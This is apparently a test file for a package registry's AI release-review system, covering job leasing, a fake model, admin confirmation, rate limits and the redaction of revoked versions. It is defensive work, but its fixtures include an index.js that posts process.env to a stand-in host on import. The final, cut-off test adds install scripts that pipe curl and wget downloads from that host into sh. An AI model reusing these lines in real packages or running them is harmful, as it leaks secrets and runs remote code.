// AI release review: the job queue, the reviewer's service token, the public, maintainer and admin
// views, the enqueue policy and the reviewer process itself. The model is a fake (Bun.serve) that
// returns canned JSON; no test calls a real model. Every package here is a harmless stand-in: the
// "flagged" one only names an unresolvable host and is never installed or run.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createHash, randomBytes } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Miniflare } from "miniflare";
import { z } from "zod";
import { LeaseResponse } from "../../packages/ai-review/src/index.ts";
import { DailyBudget } from "../../apps/reviewer/src/budget.ts";
import { silentLogger } from "../../apps/reviewer/src/log.ts";
import { modelClient } from "../../apps/reviewer/src/model.ts";
import { registryClient } from "../../apps/reviewer/src/registry.ts";
import { runOnce, type WorkerDeps } from "../../apps/reviewer/src/worker.ts";
import { addUser, deviceLogin, dig, enableTotp, getJson, signInWithGitHub, startFakeGitHub, startRegistry, totp, type Browser, type FakeGitHub, type Registry } from "./harness";

// ---------- a tar writer ----------
type TarFile = { path: string; data: string };

function tarHeader(path: string, size: number): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, off: number, len: number): void => h.set(new TextEncoder().encode(s).subarray(0, len), off);

  put(path, 0, 100);
  put("0000644\0", 100, 8);
  put("0000000\0", 108, 8);
  put("0000000\0", 116, 8);
  put(`${size.toString(8).padStart(11, "0")}\0`, 124, 12);
  put("00000000000\0", 136, 12);
  put("        ", 148, 8);
  put("0", 156, 1);
  put("ustar\0", 257, 6);
  put("00", 263, 2);
  let sum = 0;

  for (const b of h) sum += b;
  put(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8);

  return h;
}

function tgz(files: TarFile[]): Uint8Array {
  const parts: Uint8Array[] = [];

  for (const f of files) {
    const data = new TextEncoder().encode(f.data);

    parts.push(tarHeader(`package/${f.path}`, data.length), data);
    const pad = (512 - (data.length % 512)) % 512;

    if (pad > 0) parts.push(new Uint8Array(pad));
  }

  parts.push(new Uint8Array(1024));

  return Bun.gzipSync(Buffer.concat(parts));
}

type Manifest = { name: string; version: string; [key: string]: string | number | boolean | Record<string, string> };

function pkgTgz(manifest: Manifest, files: Record<string, string>): Uint8Array {
  return tgz([{ path: "package.json", data: JSON.stringify(manifest) }, ...Object.entries(files).map(([path, data]) => ({ path, data }))]);
}

async function publish(reg: Registry, token: string, manifest: Manifest, files: Record<string, string> = { "index.js": "module.exports = 1;\n" }): Promise<void> {
  const bytes = pkgTgz(manifest, files);

  const body = {
    _id: manifest.name,
    name: manifest.name,
    "dist-tags": { latest: manifest.version },
    versions: { [manifest.version]: manifest },
    _attachments: { [`${manifest.name}-${manifest.version}.tgz`]: { content_type: "application/octet-stream", data: Buffer.from(bytes).toString("base64"), length: bytes.length } },
  };

  const res = await fetch(`${reg.url}${encodeURIComponent(manifest.name)}`, {
    method: "PUT",
    headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
    body: JSON.stringify(body),
  });

  if (res.status !== 201) throw new Error(`publish ${manifest.name}@${manifest.version}: ${res.status} ${await res.text()}`);
}

// ---------- the fake model ----------
type ModelMode = "normal" | "429-once" | "down";

const FLAG = {
  verdict: "malicious",
  confidence: 0.9,
  summary: "Sends environment variables to a remote host.",
  findings: [{ file: "index.js", line: 2, quote: "collector.example.invalid", issue: "Posts process.env to a remote host on import. This exfiltrates secrets.", severity: "high" }],
};

const CLEAN = { verdict: "benign", confidence: 0.8, summary: "Nothing harmful; this package is safe.", findings: [] };

function startFakeModel() {
  let mode: ModelMode = "normal";
  const perPackage = new Map<string, number>();
  const stats = { requests: 0, inFlight: 0, maxInFlight: 0, rateLimited: 0, badKey: 0 };

  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    async fetch(req) {
      if (req.headers.get("authorization") !== "Bearer test-model-key") {
        stats.badKey++;

        return new Response("bad key", { status: 401 });
      }

      const body: unknown = await req.json();
      const content = JSON.stringify(dig(body, "messages", 1, "content") ?? "");

      stats.requests++;
      stats.inFlight++;
      stats.maxInFlight = Math.max(stats.maxInFlight, stats.inFlight);

      try {
        await Bun.sleep(30);

        if (mode === "down") return new Response("upstream model offline", { status: 503 });

        if (mode === "429-once") {
          mode = "normal";
          stats.rateLimited++;

          return new Response("slow down", { status: 429, headers: { "retry-after": "1" } });
        }

        const pkg = /Package: ([^@\s]+)@/.exec(content)?.[1] ?? "";
        const n = (perPackage.get(pkg) ?? 0) + 1;

        perPackage.set(pkg, n);
        let reply = content.includes("collector.example.invalid") ? FLAG : CLEAN;

        // the flip case: flagged on the first ask, benign on the retry
        if (pkg.startsWith("ai-review-flip")) reply = n === 1 ? FLAG : CLEAN;

        return Response.json({
          choices: [{ message: { content: JSON.stringify(reply) }, finish_reason: "stop" }],
          usage: { prompt_tokens: 1000, completion_tokens: 100, completion_tokens_details: { reasoning_tokens: 40 } },
        });
      } finally {
        stats.inFlight--;
      }
    },
  });

  return { server, url: `${server.url.toString().replace(/\/$/, "")}/v1`, setMode: (m: ModelMode) => (mode = m), stats };
}

// ---------- the fake npm: packuments, tarballs and download counts ----------
type UpVersion = { version: string; files: Record<string, string>; scripts?: Record<string, string>; at: string };

function startFakeNpm() {
  const packages = new Map<string, UpVersion[]>();
  const downloads = new Map<string, number>();

  const tarballOf = (name: string, v: UpVersion): Uint8Array => {
    const manifest = { name, version: v.version, license: "MIT", main: "index.js" };

    return pkgTgz(v.scripts ? { ...manifest, scripts: v.scripts } : manifest, v.files);
  };

  const server: ReturnType<typeof Bun.serve> = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req) {
      const u = new URL(req.url);
      const dl = /^\/downloads\/point\/last-week\/(.+)$/.exec(u.pathname);

      if (dl?.[1]) {
        const n = downloads.get(decodeURIComponent(dl[1]));

        return n === undefined ? new Response("{}", { status: 404 }) : Response.json({ downloads: n, package: dl[1] });
      }

      const tar = /^\/([^/]+)\/-\/[^/]+-(\d+\.\d+\.\d+)\.tgz$/.exec(u.pathname);

      if (tar?.[1] && tar[2]) {
        const v = packages.get(tar[1])?.find((x) => x.version === tar[2]);

        return v ? new Response(tarballOf(tar[1], v)) : new Response("nope", { status: 404 });
      }

      const name = decodeURIComponent(u.pathname.slice(1));
      const versions = packages.get(name);

      if (!versions) return Response.json({ error: "Not found" }, { status: 404 });
      const time = Object.fromEntries(versions.map((v) => [v.version, v.at]));

      const docOf = (v: UpVersion) => {
        const bytes = tarballOf(name, v);

        const doc = {
          name,
          version: v.version,
          main: "index.js",
          dist: {
            tarball: `${server.url.toString()}${name}/-/${name}-${v.version}.tgz`,
            shasum: createHash("sha1").update(bytes).digest("hex"),
            integrity: `sha512-${createHash("sha512").update(bytes).digest("base64")}`,
          },
        };

        return v.scripts ? { ...doc, scripts: v.scripts } : doc;
      };

      const docs = Object.fromEntries(versions.map((v) => [v.version, docOf(v)]));

      return Response.json({ name, "dist-tags": { latest: versions.at(-1)?.version ?? "" }, versions: docs, time });
    },
  });

  return { server, url: server.url.toString(), packages, downloads };
}

// ---------- setup ----------
const SERVICE_TOKEN = `svc_${randomBytes(24).toString("base64url")}`;
const sha256 = (s: string): string => createHash("sha256").update(s).digest("hex");

let reg: Registry;
let model: ReturnType<typeof startFakeModel>;
let npm: ReturnType<typeof startFakeNpm>;
let stateDir: string;
let clock = Date.parse("2026-11-12T10:00:00Z");
let alice: string;
let bob: string;
let gh: FakeGitHub;

// apm's reviewer: a website session with an authenticator app, and the same person's CLI tokens
let adminBrowser: Browser;
let adminSecret: string;
let adminStageToken: string;
let adminPublishToken: string;

function reviewer(over: Partial<WorkerDeps> = {}): WorkerDeps {
  return {
    registry: registryClient({ url: reg.url, token: SERVICE_TOKEN }),
    model: modelClient({ url: model.url, model: "fake-flash", key: () => "test-model-key", concurrency: 4, log: silentLogger, sleep: (ms) => Bun.sleep(Math.min(ms, 1000)) }),
    budget: new DailyBudget(stateDir, 10_000_000),
    log: silentLogger,
    secondStage: null,
    budgetTokens: 16_000,
    ...over,
  };
}

async function review(name: string, version: string, token?: string): Promise<{ status: number; body: unknown }> {
  return getJson(`${reg.url}-/apm/v1/review/${encodeURIComponent(name)}/${version}`, token ? { headers: { authorization: `Bearer ${token}` } } : undefined);
}

async function until(check: () => Promise<boolean>, ms = 3000): Promise<boolean> {
  const end = Date.now() + ms;

  while (Date.now() < end) {
    if (await check()) return true;
    await Bun.sleep(25);
  }

  return false;
}

beforeAll(async () => {
  model = startFakeModel();
  npm = startFakeNpm();
  stateDir = mkdtempSync(join(tmpdir(), "apm-reviewer-state-"));
  npm.packages.set("popular-lib", [
    { version: "1.0.0", files: { "index.js": "module.exports = 1;\n" }, at: "2026-11-01T00:00:00Z" },
    { version: "1.1.0", files: { "index.js": "module.exports = 2;\n" }, at: "2026-11-02T00:00:00Z" },
  ]);
  npm.packages.set("quiet-lib", [
    { version: "1.0.0", files: { "index.js": "module.exports = 'a';\n" }, at: "2026-11-01T00:00:00Z" },
    { version: "1.0.1", files: { "index.js": "module.exports = 'b';\n" }, at: "2026-11-02T00:00:00Z" },
    { version: "1.0.2", files: { "index.js": "module.exports = 'c';\n" }, at: "2026-11-03T00:00:00Z" },
    { version: "1.0.3", files: { "index.js": "module.exports = 'd';\n" }, at: "2026-11-04T00:00:00Z" },
  ]);
  npm.downloads.set("popular-lib", 50_000);
  npm.downloads.set("quiet-lib", 3);
  gh = startFakeGitHub();
  reg = await startRegistry({
    now: () => clock,
    github: gh,
    upstream: npm.url,
    upstreamTtlMs: 1,
    review: { serviceTokenHash: sha256(SERVICE_TOKEN), admins: ["octo-admin"], downloadsUrl: `${npm.url}downloads/point/last-week/`, requestsPerHour: 2 },
  });
  alice = await reg.mintToken({ user: "alice", scope: "publish" });
  bob = await reg.mintToken({ user: "bob", scope: "publish" });
  // admins are named by GitHub login, which sign-in records
  adminBrowser = await signInWithGitHub(reg, gh, "octo-admin");
  adminSecret = await enableTotp(adminBrowser);
  adminStageToken = (await deviceLogin(adminBrowser)).token;
  adminPublishToken = await reg.mintToken({ user: "octo-admin", scope: "publish" });
});

afterAll(async () => {
  await reg.stop();
  await model.server.stop(true);
  await npm.server.stop(true);
  await gh.stop();
  rmSync(stateDir, { recursive: true, force: true });
});

// ---------- tests ----------
describe("AI review", () => {
  test("the job queue answers only the reviewer's service token", async () => {
    const lease = `${reg.url}-/apm/v1/review-jobs?max=1`;

    expect((await getJson(lease)).status).toBe(401);
    expect((await getJson(lease, { headers: { authorization: `Bearer ${alice}` } })).status).toBe(401);
    expect((await getJson(lease, { headers: { authorization: "Bearer svc_wrong" } })).status).toBe(401);
    const ok = await getJson(lease, { headers: { authorization: `Bearer ${SERVICE_TOKEN}` } });

    expect(ok.status).toBe(200);
    expect(dig(ok.body, "jobs")).toEqual([]);
    const result = await getJson(`${reg.url}-/apm/v1/review-jobs/abc/result`, { method: "POST", headers: { authorization: `Bearer ${alice}` }, body: "{}" });

    expect(result.status).toBe(401);
  });

  test("a local publish is reviewed and shown as coverage, never as a verdict of safety", async () => {
    await publish(reg, alice, { name: "ai-review-clean-demo", version: "1.0.0", license: "MIT", main: "index.js" });
    expect(dig((await review("ai-review-clean-demo", "1.0.0")).body, "status")).toBe("queued");
    expect(await runOnce(reviewer(), 4)).toBe(1);
    const r = await review("ai-review-clean-demo", "1.0.0");

    expect(r.status).toBe(200);
    expect(dig(r.body, "status")).toBe("reviewed");
    expect(dig(r.body, "review", "state")).toBe("found-nothing");
    expect(dig(r.body, "review", "model")).toBe("fake-flash");
    expect(dig(r.body, "review", "coverage")).toEqual({ mode: "files", previousVersion: null, filesInScope: 2, filesRead: 2 });
    expect(dig(r.body, "review", "findings")).toEqual([]);
    expect(dig(r.body, "private")).toBeNull();
    // the model's own words ("safe") never reach the public answer
    expect(JSON.stringify(r.body)).not.toContain("safe");
    expect(JSON.stringify(r.body)).not.toContain("confidence");

    await publish(reg, alice, { name: "ai-review-clean-demo", version: "1.0.1", license: "MIT", main: "index.js" }, { "index.js": "module.exports = 2;\n" });
    expect(await runOnce(reviewer(), 4)).toBe(1);
    const next = await review("ai-review-clean-demo", "1.0.1");

    expect(dig(next.body, "review", "coverage")).toEqual({ mode: "diff", previousVersion: "1.0.0", filesInScope: 2, filesRead: 2 });
  });

  test("the review answer takes a dist-tag, so the website can ask for latest while it reads the package answer", async () => {
    await publish(reg, alice, { name: "ai-review-tag-demo", version: "1.0.0", license: "MIT", main: "index.js" });
    await publish(reg, alice, { name: "ai-review-tag-demo", version: "1.1.0", license: "MIT", main: "index.js" }, { "index.js": "module.exports = 2;\n" });
    const byTag = await review("ai-review-tag-demo", "latest");
    const byVersion = await review("ai-review-tag-demo", "1.1.0");

    expect(byTag.status).toBe(200);
    expect(dig(byTag.body, "version")).toBe("1.1.0");
    expect(byTag.body).toEqual(byVersion.body);
    // a name that is neither a version nor a tag is still no version
    expect((await review("ai-review-tag-demo", "nightly")).status).toBe(404);
    // the two publishes queued a review each; finish them so the next test's reviewer sees only its own
    expect(await runOnce(reviewer(), 4)).toBe(2);
  });

  test("a flagged release reads 'under review' in public; owners and admins see the findings; only a confirmed one goes public", async () => {
    const asked = model.stats.requests;

    await publish(reg, alice, { name: "ai-review-telemetry-demo", version: "1.0.0", license: "MIT", main: "index.js" }, {
      "index.js": "const https = require('https');\nhttps.request({ host: 'collector.example.invalid', method: 'POST' }).end(JSON.stringify(process.env));\n",
    });
    expect(await runOnce(reviewer(), 4)).toBe(1);
    // a flag is asked twice before it counts
    expect(model.stats.requests - asked).toBe(2);
    const anon = await review("ai-review-telemetry-demo", "1.0.0");

    expect(dig(anon.body, "review", "state")).toBe("under-review");
    expect(dig(anon.body, "review", "findings")).toEqual([]);
    expect(dig(anon.body, "private")).toBeNull();
    expect(JSON.stringify(anon.body)).not.toContain("collector");
    expect(dig((await review("ai-review-telemetry-demo", "1.0.0", bob)).body, "private")).toBeNull();
    const owner = await review("ai-review-telemetry-demo", "1.0.0", alice);

    expect(dig(owner.body, "viewer")).toBe("maintainer");
    expect(dig(owner.body, "private", "outcome")).toBe("flagged");
    expect(dig(owner.body, "private", "findings", 0, "file")).toBe("index.js");
    expect(dig(owner.body, "private", "findings", 0, "line")).toBe(2);
    expect(dig(owner.body, "private", "findings", 0, "issue")).toBe("Posts process.env to a remote host on import.");

    const queue = `${reg.url}-/apm/v1/review-admin/queue`;

    expect((await getJson(queue)).status).toBe(401);
    expect((await getJson(queue, { headers: { authorization: `Bearer ${bob}` } })).status).toBe(403);

    // the queue and its decisions are for the website: no token of the reviewer's opens them
    for (const t of [adminStageToken, adminPublishToken]) expect((await getJson(queue, { headers: { authorization: `Bearer ${t}` } })).status).toBe(403);
    const q = await adminBrowser.json("-/apm/v1/review-admin/queue");

    expect(q.status).toBe(200);
    expect(dig(q.body, "pending", 0, "name")).toBe("ai-review-telemetry-demo");
    expect(dig(q.body, "secondStage")).toBeNull();
    const digest = dig(q.body, "pending", 0, "digest");

    const decision = { name: "ai-review-telemetry-demo", version: "1.0.0", digest, decision: "confirm", note: "Checked by hand." };

    const decide = (token: string): Promise<{ status: number; body: unknown }> =>
      getJson(`${reg.url}-/apm/v1/review-admin/decide`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
        body: JSON.stringify(decision),
      });

    expect((await decide(bob)).status).toBe(403);
    expect((await decide(adminStageToken)).status).toBe(403);
    expect((await decide(adminPublishToken)).status).toBe(403);
    // a decision needs a fresh code from the reviewer's authenticator app
    expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: decision })).status).toBe(401);
    expect(dig((await review("ai-review-telemetry-demo", "1.0.0")).body, "review", "state")).toBe("under-review");
    expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: { ...decision, code: totp(adminSecret) } })).status).toBe(200);
    const after = await review("ai-review-telemetry-demo", "1.0.0");

    expect(dig(after.body, "review", "state")).toBe("confirmed");
    expect(dig(after.body, "review", "findings", 0, "line")).toBe(2);
    expect(dig(after.body, "review", "note")).toBe("Checked by hand.");
  });

  test("a verdict that flips between the two asks is not settled and is not called clean", async () => {
    await publish(reg, alice, { name: "ai-review-flip-demo", version: "1.0.0", license: "MIT", main: "index.js" }, {
      "index.js": "const https = require('https');\nhttps.request({ host: 'collector.example.invalid' });\n",
    });
    expect(await runOnce(reviewer(), 4)).toBe(1);
    expect(dig((await review("ai-review-flip-demo", "1.0.0")).body, "review", "state")).toBe("under-review");
    expect(dig((await review("ai-review-flip-demo", "1.0.0", alice)).body, "private", "reason")).toBe("unsettled");
  });

  test("a requested retry of a review with no answer reads as queued until it finishes, next to the older result", async () => {
    await publish(reg, alice, { name: "ai-review-flip-retry", version: "1.0.0", license: "MIT", main: "index.js" }, {
      "index.js": "const https = require('https');\nhttps.request({ host: 'collector.example.invalid' });\n",
    });
    expect(await runOnce(reviewer(), 4)).toBe(1);
    expect(dig((await review("ai-review-flip-retry", "1.0.0", alice)).body, "private", "outcome")).toBe("no-answer");
    const carol = await reg.mintToken({ user: "carol", scope: "publish" });
    const asked = await getJson(`${reg.url}-/apm/v1/review/ai-review-flip-retry/1.0.0/request`, { method: "POST", headers: { authorization: `Bearer ${carol}` } });

    expect(asked.status).toBe(202);
    // the card polls while the answer says queued: the older result is still shown, and the retry is not offered again
    const waiting = await review("ai-review-flip-retry", "1.0.0", carol);

    expect(dig(waiting.body, "status")).toBe("queued");
    expect(dig(waiting.body, "review", "state")).toBe("under-review");
    expect(dig(waiting.body, "canRequest")).toBe(false);
    expect(await runOnce(reviewer(), 4)).toBe(1);
    const done = await review("ai-review-flip-retry", "1.0.0");

    expect(dig(done.body, "status")).toBe("reviewed");
    expect(dig(done.body, "review", "state")).toBe("found-nothing");
  });

  test("leases expire, and a result needs the current lease", async () => {
    await publish(reg, alice, { name: "ai-review-lease-demo", version: "1.0.0", license: "MIT", main: "index.js" });
    const lease = async (): Promise<LeaseResponse["jobs"]> => LeaseResponse.parse((await getJson(`${reg.url}-/apm/v1/review-jobs?max=1`, { headers: { authorization: `Bearer ${SERVICE_TOKEN}` } })).body).jobs;
    const [first] = await lease();

    expect(first?.name).toBe("ai-review-lease-demo");
    expect(first?.tarballPath).toBe("ai-review-lease-demo/-/ai-review-lease-demo-1.0.0.tgz");
    expect(await lease()).toEqual([]);
    clock += 16 * 60_000;
    const [again] = await lease();

    expect(again?.id).toBe(first?.id ?? "");
    expect(again?.leaseId).not.toBe(first?.leaseId ?? "");

    const release = (leaseId: string): Promise<{ status: number; body: unknown }> =>
      getJson(`${reg.url}-/apm/v1/review-jobs/${first?.id ?? ""}/release`, {
        method: "POST",
        headers: { authorization: `Bearer ${SERVICE_TOKEN}`, "content-type": "application/json" },
        body: JSON.stringify({ leaseId, error: "tarball unreadable", retryable: false }),
      });

    expect((await release(first?.leaseId ?? "")).status).toBe(409);
    expect((await release(again?.leaseId ?? "")).status).toBe(200);
    expect(dig((await review("ai-review-lease-demo", "1.0.0")).body, "status")).toBe("failed");
  });

  test("popular upstream versions are queued when first seen; quiet ones only for a first publish or a new install script", async () => {
    expect((await getJson(`${reg.url}popular-lib`)).status).toBe(200);
    expect(await until(async () => dig((await review("popular-lib", "1.1.0")).body, "status") === "queued")).toBe(true);
    // first sight queues the latest version only, not the whole history
    expect(dig((await review("popular-lib", "1.0.0")).body, "status")).toBe("not-reviewed");
    expect((await getJson(`${reg.url}quiet-lib`)).status).toBe(200);
    await Bun.sleep(200);
    expect(dig((await review("quiet-lib", "1.0.3")).body, "status")).toBe("not-reviewed");

    npm.packages.get("quiet-lib")?.push({ version: "1.0.4", files: { "index.js": "module.exports = 'e';\n", "setup.js": "console.log('hi');\n" }, scripts: { postinstall: "node setup.js" }, at: "2026-11-05T00:00:00Z" });
    expect((await getJson(`${reg.url}quiet-lib`)).status).toBe(200);
    expect(await until(async () => dig((await review("quiet-lib", "1.0.4")).body, "status") === "queued")).toBe(true);
    const lease = await getJson(`${reg.url}-/apm/v1/review-jobs?max=8`, { headers: { authorization: `Bearer ${SERVICE_TOKEN}` } });
    const byName = new Map(LeaseResponse.parse(lease.body).jobs.map((j) => [`${j.name}@${j.version}`, j]));

    expect(byName.get("popular-lib@1.1.0")?.reasons).toEqual(["popular"]);
    expect(byName.get("popular-lib@1.1.0")?.previous?.version).toBe("1.0.0");
    expect(byName.get("quiet-lib@1.0.4")?.reasons).toEqual(["install-script"]);
    // let the leases lapse so later tests start from an empty queue
    clock += 16 * 60_000;
    expect(await runOnce(reviewer(), 4)).toBe(2);
  });

  test("Request AI review needs a signed-in user and is rate-limited", async () => {
    const request = (version: string, token?: string): Promise<{ status: number; body: unknown }> =>
      getJson(`${reg.url}-/apm/v1/review/quiet-lib/${version}/request`, { method: "POST", headers: token ? { authorization: `Bearer ${token}` } : {} });

    expect((await request("1.0.1")).status).toBe(401);
    expect((await request("1.0.1", bob)).status).toBe(202);
    // asking again while it waits does not count against the limit
    expect((await request("1.0.1", bob)).status).toBe(200);
    expect((await request("1.0.2", bob)).status).toBe(202);
    expect((await request("1.0.3", bob)).status).toBe(429);
    expect(dig((await review("quiet-lib", "1.0.1", bob)).body, "status")).toBe("queued");
    expect(dig((await review("quiet-lib", "1.0.1")).body, "canRequest")).toBe(false);
    expect(await runOnce(reviewer(), 4)).toBe(2);
    expect((await request("1.0.1", alice)).status).toBe(409);
  });

  test("the reviewer keeps at most 4 model requests in flight and waits out Retry-After", async () => {
    for (let i = 0; i < 6; i++) await publish(reg, alice, { name: `ai-review-load-demo-${i}`, version: "1.0.0", license: "MIT", main: "index.js" });
    model.stats.maxInFlight = 0;
    model.setMode("429-once");
    const started = Date.now();

    expect(await runOnce(reviewer(), 6)).toBe(6);
    expect(model.stats.rateLimited).toBe(1);
    expect(model.stats.maxInFlight).toBeLessThanOrEqual(4);
    expect(Date.now() - started).toBeGreaterThanOrEqual(1000);

    for (let i = 0; i < 6; i++) expect(dig((await review(`ai-review-load-demo-${i}`, "1.0.0")).body, "status")).toBe("reviewed");
  });

  test("when the model is down, jobs go back to the queue instead of becoming results", async () => {
    await publish(reg, alice, { name: "ai-review-outage-demo", version: "1.0.0", license: "MIT", main: "index.js" });
    model.setMode("down");
    expect(await runOnce(reviewer({ model: modelClient({ url: model.url, model: "fake-flash", key: () => "test-model-key", concurrency: 4, log: silentLogger, sleep: async () => {} }) }), 4)).toBe(1);
    model.setMode("normal");
    expect(dig((await review("ai-review-outage-demo", "1.0.0")).body, "status")).toBe("queued");
    expect(await runOnce(reviewer(), 4)).toBe(1);
    expect(dig((await review("ai-review-outage-demo", "1.0.0")).body, "review", "state")).toBe("found-nothing");
    expect(model.stats.badKey).toBe(0);
  });

  // review item 5: the high-water mark used to be committed before the jobs, so a failed insert lost the release for good
  test("an upstream release whose enqueue failed is queued by the next fetch", async () => {
    npm.packages.set("review-loss-lib", [{ version: "1.0.0", files: { "index.js": "module.exports = 'x';\n" }, at: "2026-11-06T00:00:00Z" }]);
    npm.downloads.set("review-loss-lib", 50_000);
    // a fault only this package's job hits: the insert into review_jobs fails
    await reg.query(
      `CREATE FUNCTION apm_test_refuse_job() RETURNS trigger LANGUAGE plpgsql AS $$
       BEGIN IF NEW.package = 'review-loss-lib' THEN RAISE EXCEPTION 'test: enqueue refused'; END IF; RETURN NEW; END $$`,
    );
    await reg.query("CREATE TRIGGER apm_test_refuse_job BEFORE INSERT ON review_jobs FOR EACH ROW EXECUTE FUNCTION apm_test_refuse_job()");

    try {
      expect((await getJson(`${reg.url}review-loss-lib`)).status).toBe(200);
      // the policy runs after the response: it reads the download count, then tries to queue the job
      expect(await until(async () => (await reg.query("SELECT 1 FROM review_downloads WHERE package = 'review-loss-lib'")).length > 0)).toBe(true);
      await Bun.sleep(500);
      expect(dig((await review("review-loss-lib", "1.0.0")).body, "status")).toBe("not-reviewed");
    } finally {
      await reg.query("DROP TRIGGER apm_test_refuse_job ON review_jobs");
      await reg.query("DROP FUNCTION apm_test_refuse_job()");
    }

    expect((await getJson(`${reg.url}review-loss-lib`)).status).toBe(200);
    expect(await until(async () => dig((await review("review-loss-lib", "1.0.0")).body, "status") === "queued")).toBe(true);
  });
});

// ---------- a revoked version's answers ----------
describe("a revoked version", () => {
  const PASSWORD = "correct-horse-battery";
  const DAY = 24 * 60 * 60 * 1000;
  const SOURCE = "collector.example.invalid";
  const files = { "index.js": `const https = require('https');\nhttps.request({ host: '${SOURCE}', method: 'POST' }).end(JSON.stringify(process.env));\n` };
  const manifest = (name: string) => ({ name, version: "1.0.0", license: "MIT", main: "index.js", readme: `# demo\n\nReports to ${SOURCE}.`, scripts: { postinstall: "node index.js" } }) satisfies Manifest;
  const score = (name: string) => getJson(`${reg.url}-/apm/v1/score/${name}/1.0.0`);
  const pkg = (name: string) => getJson(`${reg.url}-/apm/v1/packages/${name}`);
  const Evidence = z.object({ evidence: z.array(z.string()) });
  const ScoreEvidence = z.object({ signals: z.array(Evidence), dismissed: z.array(Evidence).default([]) });
  const Queue = z.object({ pending: z.array(z.object({ name: z.string(), digest: z.string() })) });
  const SignalIds = z.object({ signals: z.array(z.object({ id: z.string() })) });

  /** Every view the website reads (apps/web/lib/revoke-views.workerd-entry.ts); each is a Fetched answer or a Status. */
  const Views = z.object({
    package: z.unknown(),
    file: z.unknown(),
    excerpt: z.unknown(),
    tarballReadme: z.unknown(),
    review: z.unknown(),
    score: z.unknown(),
    packageStatus: z.string(),
    fileStatus: z.string(),
    apiReadme: z.object({ status: z.number(), cacheControl: z.string().nullable(), body: z.string() }),
  });

  /** The views that quote a version's source while it may be shown. */
  const QUOTING = ["package", "file", "excerpt", "tarballReadme", "review", "score", "apiReadme"] as const;

  /** Revokes `name@version` as its owner. */
  const revoke = (token: string, name: string, version = "1.0.0") =>
    getJson(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ name, version, reason: "posts the environment", password: PASSWORD }),
    });

  /** Every evidence line of a version's score, signals and dismissed items alike. */
  const evidenceOf = async (name: string): Promise<string[]> => {
    const s = ScoreEvidence.parse((await score(name)).body);

    return [...s.signals, ...s.dismissed].flatMap((e) => e.evidence);
  };

  test("its review, score and package answers keep what was found, not the source it quoted, revoked or pending", async () => {
    const carol = await addUser(reg, "carol-revokes", PASSWORD);

    // four days old when it is revoked, so the revoke is pending; the other is new, so it is final at once
    const cases = [
      { name: "ai-review-pending-demo", status: "revoke-pending" },
      { name: "ai-review-revoked-demo", status: "revoked" },
    ] as const;

    await publish(reg, carol, manifest(cases[0].name), files);
    clock += 4 * DAY;
    await publish(reg, carol, manifest(cases[1].name), files);

    for (let n = await runOnce(reviewer(), 4); n > 0; n = await runOnce(reviewer(), 4)) await Bun.sleep(0);
    const queue = Queue.parse((await adminBrowser.json("-/apm/v1/review-admin/queue")).body);

    for (const { name } of cases) {
      const decision = { name, version: "1.0.0", digest: queue.pending.find((p) => p.name === name)?.digest, decision: "confirm", note: "Checked by hand.", code: totp(adminSecret) };

      expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: decision })).status).toBe(200);
      // before the revoke, the confirmed finding, the score and the package page quote the package
      const before = await review(name, "1.0.0");

      expect(JSON.stringify(before.body)).toContain(SOURCE);
      expect(dig(before.body, "redacted")).toBe(false);
      expect((await evidenceOf(name)).join("\n")).toContain(SOURCE);
      expect(JSON.stringify((await pkg(name)).body)).toContain(SOURCE);
    }

    for (const { name, status } of cases) {
      const r = await getJson(`${reg.url}-/apm/v1/revoke`, {
        method: "POST",
        headers: { "content-type": "application/json", authorization: `Bearer ${carol}` },
        body: JSON.stringify({ name, version: "1.0.0", reason: "posts the environment", password: PASSWORD }),
      });

      expect(dig(r.body, "status")).toBe(status);
      // the file itself is refused
      expect((await getJson(`${reg.url}-/apm/v1/file/${name}/1.0.0?path=index.js`)).status).toBe(410);

      // the public answer and the maintainer's
      for (const viewer of [undefined, carol]) {
        const after = await review(name, "1.0.0", viewer);

        expect(after.status).toBe(200);
        expect(JSON.stringify(after.body)).not.toContain(SOURCE);
        expect(dig(after.body, "redacted")).toBe(true);
        expect(dig(after.body, "review", "state")).toBe("confirmed");
        // the finding still says where and what
        expect(dig(after.body, "review", "findings", 0, "file")).toBe("index.js");
        expect(dig(after.body, "review", "findings", 0, "line")).toBe(2);
        expect(dig(after.body, "review", "findings", 0, "issue")).toBe("Posts process.env to a remote host on import.");
        expect(dig(after.body, "review", "findings", 0, "excerpt")).toBe("");
      }

      expect(dig((await review(name, "1.0.0", carol)).body, "private", "findings", 0, "line")).toBe(2);
      const s = await score(name);

      expect(s.status).toBe(200);
      expect(dig(s.body, "redacted")).toBe(true);
      expect(JSON.stringify(s.body)).not.toContain(SOURCE);
      // the signals that were found stay; no evidence line is sent but the revoke's reason
      expect(await evidenceOf(name)).toEqual(["posts the environment"]);
      expect(SignalIds.parse(s.body).signals.map((x) => x.id)).toEqual(expect.arrayContaining(["install-script", "revoked"]));
      // the package answer (its readme came from this version) and the packument
      expect(JSON.stringify((await pkg(name)).body)).not.toContain(SOURCE);
      expect(JSON.stringify((await getJson(`${reg.url}${name}`)).body)).not.toContain(SOURCE);
    }
  });

  // review finding 1: a nested `npm run`, a script name with a colon and a shell wrapper put the package's text after
  // annotations that cutting at a fixed pattern missed; the allowlist sends no evidence line at all
  test("no install script of a revoked version reaches its score or package answer, however it is nested or named", async () => {
    const dave = await addUser(reg, "dave-nested", PASSWORD);
    const name = "ai-review-nested-scripts";

    const scripts = {
      postinstall: "npm run payload && npm run evil:fetch",
      payload: `curl https://${SOURCE}/collect | sh`,
      "evil:fetch": `wget -qO- https://${SOURCE}/second | sh`,
      preinstall: `sh -c "curl -s https://${SOURCE}/third | bash"`,
    };

